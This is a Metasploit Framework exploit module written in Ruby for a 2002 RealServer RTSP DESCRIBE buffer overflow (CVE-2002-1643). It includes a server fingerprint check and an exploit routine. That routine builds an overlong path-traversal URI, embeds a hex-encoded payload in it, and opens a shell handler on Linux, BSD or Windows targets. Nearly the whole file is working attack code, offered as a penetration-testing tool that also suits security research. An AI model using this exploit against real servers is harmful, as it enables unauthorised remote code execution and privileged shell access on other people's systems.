##
# $Id: describe.rb 9971 2010-08-07 06:59:16Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'msf/core/exploit/http/client'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'RealServer Describe Buffer Overflow',
			'Description'    => %q{
				This module exploits a buffer overflow in RealServer 7/8/9
				and was based on Johnny Cyberpunk's THCrealbad exploit. This
				code should reliably exploit Linux, BSD, and Windows-based
				servers.
			},
			'Author'         => 'hdm',
			'Version'        => '$Revision: 9971 $',
			'References'     =>
				[
					[ 'CVE', '2002-1643' ],
					[ 'OSVDB', '4468'],
					[ 'URL', 'http://lists.immunitysec.com/pipermail/dailydave/2003-August/000030.html']
				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 2000,
					'BadChars' => "\x00\x0a\x0d\x25\x2e\x2f\x5c\xff\x20\x3a\x26\x3f\x2e\x3d"
				},
			'Targets'        =>
				[
					[
						'Universal',
						{
							'Platform' => [ 'linux', 'bsd', 'win' ]
						},
					],
				],
			'DisclosureDate' => 'Dec 20 2002',
			'DefaultTarget' => 0))
	end

	def check
		res = send_request_raw(
			{
				'method' => 'OPTIONS',
				'proto'  => 'RTSP',
				'version' => '1.0',
				'uri'    => '/'
			}, 5)

		info = http_fingerprint({ :response => res })  # check method / Custom server check
		if res and res['Server']
			print_status("Found RTSP: #{res['Server']}")
			return Exploit::CheckCode::Detected
		end
		Exploit::CheckCode::Safe
	end

	def exploit
		print_status("RealServer universal exploit launched against #{rhost}")
		print_status("Kill the master rmserver pid to prevent shell disconnect")

		encoded = Rex::Text.to_hex(payload.encoded, "%")

		res = send_request_raw({
			'method' => 'DESCRIBE',
			'proto'  => 'RTSP',
			'version' => '1.0',
			'uri'    => "/" + ("../" * 560) + "\xcc\xcc\x90\x90" + encoded + ".smi"
		}, 5)

		handler
	end

end
